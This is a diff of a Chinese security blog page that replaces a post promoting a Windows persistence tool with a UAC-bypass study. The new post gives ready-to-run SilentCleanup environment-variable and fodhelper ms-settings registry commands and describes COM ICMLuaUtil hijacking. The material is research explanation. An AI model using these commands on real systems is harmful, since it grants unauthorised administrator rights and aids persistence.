@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>python权限维持-(碧鳞蛇) | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="python权限维持-(碧鳞蛇) | 九世的博客">
+  <title>bypass UAC研究 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="bypass UAC研究 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1495,9 +1495,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-python权限维持-碧鳞蛇" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-bypass-UAC研究" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">python权限维持-(碧鳞蛇)</h1>
+        <h1 class="article-title">bypass UAC研究</h1>
     
     <div class="article-meta">
         
@@ -1506,14 +1506,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-05-19 14:16:32">2019-05-19 11:52</time>
+        创建时间:<time class="date" title="更新时间: 2020-10-08 01:50:53">2020-10-08 00:46</time>
         
     </div>
     <div class="article-meta">
@@ -1535,7 +1535,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#声明"><span class="toc-text">声明</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#UAC是何物"><span class="toc-text">UAC是何物</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-UAC的要求"><span class="toc-text">bypass UAC的要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#交互式bypass"><span class="toc-text">交互式bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方式一：利用自带的计划任务"><span class="toc-text">方式一：利用自带的计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法二：程序以高权执行某些进程"><span class="toc-text">方法二：程序以高权执行某些进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法三：COM接口函数劫持"><span class="toc-text">方法三：COM接口函数劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1550,32 +1550,64 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上个星期写了一篇学习权限维持的博客，后面想了一会不如写个权限维持的工具吧。方便耍<br>所以就有了这篇文章,取名此工具为–碧鳞蛇</p>
-<p><img src="http://pic.netbian.com/uploads/allimg/190505/152641-1557041201f908.jpg" alt=""></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>思路就是实现上篇文章所说的东西<br><img src="https://s2.ax1x.com/2019/05/19/EXLlsH.png" alt=""></p>
-<p><b>指定进程检测</b>:</p>
-<p>可以使用自定义的方法去检测是否有指定的进程，指定的文件要写成如下</p>
-<pre><code>exe名称 - 注释
-例如:phpstudy.exe - phpstudy工具
-</code></pre><p>测试:<br><img src="https://s2.ax1x.com/2019/05/19/EXOemj.png" alt=""></p>
-<p><b>修改注册表实现开机自启</b>:<br>以下路径可以实现开机自启<br><img src="https://s2.ax1x.com/2019/05/19/EXOMt0.png" alt=""></p>
-<p>在指定注册表路径之前，会检测上图的注册表路径看看是否已存在后门<br><img src="https://s2.ax1x.com/2019/05/19/EXO31U.md.png" alt=""></p>
-<p>选择一个序列添加注册表键值<br><img src="https://s2.ax1x.com/2019/05/19/EXOdtx.png" alt=""></p>
-<p>重启或注销就能看到效果<br><img src="https://s2.ax1x.com/2019/05/19/EXOgHA.gif" alt=""></p>
-<p><b>计划任务添加</b>:<br>可选项<br><img src="https://s2.ax1x.com/2019/05/19/EXOLEn.md.png" alt=""></p>
-<p>选择分钟的<br><img src="https://s2.ax1x.com/2019/05/19/EXOzgU.md.png" alt=""></p>
-<p>(这gif和上一个gif合并了，请耐心看完)<br><img src="https://s2.ax1x.com/2019/05/19/EXXFER.gif" alt=""></p>
-<p><b>启动文件添加</b><br>输入要移动的文件路径，会移动到启动文件夹<br><img src="https://s2.ax1x.com/2019/05/19/EXXZ8K.png" alt=""></p>
-<p>动图<br><img src="https://s2.ax1x.com/2019/05/19/EXXtxS.gif" alt=""></p>
-<p><b>映像劫持</b>:<br><img src="https://s2.ax1x.com/2019/05/19/EXXyGV.gif" alt=""></p>
-<p><b>Winlogon劫持</b>:<br><img src="https://s2.ax1x.com/2019/05/19/EXXOqH.gif" alt=""></p>
-<p>注意:此操作有一定的风险，比如造成windows歇菜</p>
-<p>无限重启…<br><img src="https://s2.ax1x.com/2019/05/19/EXjVds.png" alt=""></p>
-<p>真优….<br><img src="https://s2.ax1x.com/2019/05/19/EXjlyF.md.png" alt=""></p>
-<p><b>Appinit_DLls劫持</b>:<br><img src="https://s2.ax1x.com/2019/05/19/EjpPbD.md.png" alt=""></p>
-<p>剩下的两个就不演示了，上学…</p>
-<p>仓库地址:<a href="https://github.com/422926799/python/tree/master/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81" target="_blank" rel="noopener">Github-碧鳞蛇</a></p>
-<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>转载请声明：来自422926799.github.io<br>禁止做任何商业用途</p>
+        <p>水了一天，明天出发准备上学。先去玩几天，早上原本就打算写<br>刷b站硬是刷到了晚上</p>
+<h2 id="UAC是何物"><a href="#UAC是何物" class="headerlink" title="UAC是何物"></a>UAC是何物</h2><blockquote>
+<p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为”恶意软件”）损坏系统的效果。<br>主要用于隔离administrator和user的权限<br><img src="https://s1.ax1x.com/2020/10/08/0wPgn1.png" alt=""></p>
+</blockquote>
+<p>高:<br>任何程序启动都需要申请</p>
+<p>默认：<br>UAC在不手动更改的情况下，程序需要administrator权限的时候。会弹出框框申请</p>
+<p>中:<br>申请administrator权限不弹出申请框框，默认允许</p>
+<p>从不提醒：<br>所有程序启动皆为administrator权限</p>
+<h2 id="bypass-UAC的要求"><a href="#bypass-UAC的要求" class="headerlink" title="bypass UAC的要求"></a>bypass UAC的要求</h2><p>UAC设置为默认或更低<br>低权用户有权限执行的（可以是COM，计划任务，dll劫持等）</p>
+<h2 id="交互式bypass"><a href="#交互式bypass" class="headerlink" title="交互式bypass"></a>交互式bypass</h2><p>例如：执行了MMC，然后在MMC打开文件选项选择cmd.exe执行<br><img src="https://s1.ax1x.com/2020/10/08/0wiWKs.png" alt=""></p>
+<p>利用权限继承，在一个有administrator权限的进程里执行另外的进程从而实现绕过UAC<br>但是这种始终无法真正的利用</p>
+<h2 id="方式一：利用自带的计划任务"><a href="#方式一：利用自带的计划任务" class="headerlink" title="方式一：利用自带的计划任务"></a>方式一：利用自带的计划任务</h2><p>\Microsoft\Windows\DiskCleanup\SilentCleanup计划任务</p>
+<pre><code># cmd
+setx windir cmd /k
+schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+or
+# powershell
+New-ItemProperty &quot;HKCU:\Environment&quot; -Name &quot;windir&quot; -Value &quot;cmd.exe /k cmd.exe&quot; -PropertyType String -Force #用户环境变量注册表
+schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+</code></pre><p>原因：\Microsoft\Windows\DiskCleanup\SilentCleanup服务以administrator运行，且计划任务任何用户都可以启动。启动程序使用用户变量%windir%这样去执行程序，通过修改用户变量课可实现bypass UAC<br><img src="https://s1.ax1x.com/2020/10/08/0wiHGF.png" alt=""></p>
+<p>计划任务的设置如下<br><img src="https://s1.ax1x.com/2020/10/08/0wiOM9.png" alt=""></p>
+<p>执行的操作<br><img src="https://s1.ax1x.com/2020/10/08/0wFSIK.png" alt=""></p>
+<h2 id="方法二：程序以高权执行某些进程"><a href="#方法二：程序以高权执行某些进程" class="headerlink" title="方法二：程序以高权执行某些进程"></a>方法二：程序以高权执行某些进程</h2><p>例如：<br>fodhelper.exe和computerdefaults.exe存在bypass UAC</p>
+<pre><code># powershell
+New-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force
+New-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -Force
+Set-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value cmd.exe -Force
+Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot;
+Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Force
+or
+# cmd
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d &quot;&quot;
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d cmd.exe
+fodhelper.exe
+reg delete HKCU\Software\Classes\ms-settings\ /F
+</code></pre><p><img src="https://s1.ax1x.com/2020/10/08/0wFCGD.png" alt=""></p>
+<p>通过进程监测可以看到如下过程<br><img src="https://s1.ax1x.com/2020/10/08/0wFPRe.png" alt=""></p>
+<p>首先寻找了</p>
+<pre><code>HKCU\Software\Classes\ms-settings\Shell\Open\command key:(Default)
+</code></pre><p>然后在寻找了</p>
+<pre><code>HKCU\Software\Classes\ms-settings\Shell\Open\command key:DelegateExecute
+</code></pre><p>当HKCU\Software\Classes\ms-settings\Shell\Open\command路径找不到的时候才去找HKCR\ms-settings\Classes\ms-settings\Shell\Open\command<br><img src="https://s1.ax1x.com/2020/10/08/0wF6dx.png" alt=""></p>
+<p>Shell\Open\Command默认键名(Default)为所执行的程序,DelegateExecute为对应COM接口的CLSID<br><img src="https://s1.ax1x.com/2020/10/08/0wF2FK.png" alt=""></p>
+<h2 id="方法三：COM接口函数劫持"><a href="#方法三：COM接口函数劫持" class="headerlink" title="方法三：COM接口函数劫持"></a>方法三：COM接口函数劫持</h2><p>COM接口劫持需要先找到一些在system32目录下的dll，一般都是系统自带的COM接口<br>然后从这些接口里寻找可用的函数，例如：cmdlua.dll里的shellExecW，GUID：3E5FC7F9-9A51-4367-9063-A120244FBEC7<br>OleViewDotNet（Administrator权限运行）查询对应的CLSID<br><img src="https://s1.ax1x.com/2020/10/08/0wFxyj.png" alt=""></p>
+<p>然后跟踪这个ICMLuaUtil接口可以看到下面的函数<br><img src="https://s1.ax1x.com/2020/10/08/0wkZ6J.png" alt=""></p>
+<p>IDA反编译对应的DLL通过虚函数表搜索地址/搜索关键字ICMLuaUtil可以看到下面的函数<br>从0开始数到9，shellExec正好对应Proc9<br><img src="https://s1.ax1x.com/2020/10/08/0wkKTx.png" alt=""></p>
+<p>然后只需要编写调用COM接口即可<br>注意：这里CPP定义的接口函数数量和IDA反编译出来的数量一样（除了要调用的函数）<br><img src="https://s1.ax1x.com/2020/10/08/0wkYXd.png" alt=""></p>
+<p>编译好对应的dll后，使用rundll32调用效果如下<br><img src="https://s1.ax1x.com/2020/10/08/0wka7t.png" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果是劫持环境变量，从计划任务找bypass UAC的话注意两点： （只适用于 windows10，windows7或以下的在设置计划任务的时候，环境变量是什么就一直是那个环境变量的值，不会在改变。除非删除任务重新弄）</p>
+<ul>
+<li>计划任务状态为非禁用</li>
+<li>计划任务的触发器为:启动程序 (其他的话要按照对应的触发器是触发)</li>
+<li>详细信息的里路径程序带参数，且参数用户的用户环境变量</li>
+</ul>
+<p>COM接口劫持需要先找到一些在system32目录下的dll，一般都是系统自带的COM接口<br>然后从这些接口里寻找可用的函数</p>
+<p>一般利用COM都是自动化搜索然后人工审计多</p>
+<p>DLL劫持因为时间问题暂时没复现</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://swapcontext.blogspot.com/2020/10/uacme-35-wd-and-ways-of-mitigation.html?m=1" target="_blank" rel="noopener">https://swapcontext.blogspot.com/2020/10/uacme-35-wd-and-ways-of-mitigation.html?m=1</a><br><a href="https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz" target="_blank" rel="noopener">https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz</a><br>COM劫持代码来源：<a href="https://www.write-bug.com/article/2000.html" target="_blank" rel="noopener">https://www.write-bug.com/article/2000.html</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1585,12 +1617,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>python权限维持-(碧鳞蛇)</p>
+    <p><span class="copy-title">文章标题:</span>bypass UAC研究</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-05-19, 11:52:17</p>
-    <p><span class="copy-title">最后更新:</span>2019-05-19, 14:16:32</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/91b15c6.html" title="python权限维持-(碧鳞蛇)">http://422926799.github.io/posts/91b15c6.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-10-08, 00:46:32</p>
+    <p><span class="copy-title">最后更新:</span>2020-10-08, 01:50:53</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/70084607.html" title="bypass UAC研究">http://422926799.github.io/posts/70084607.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
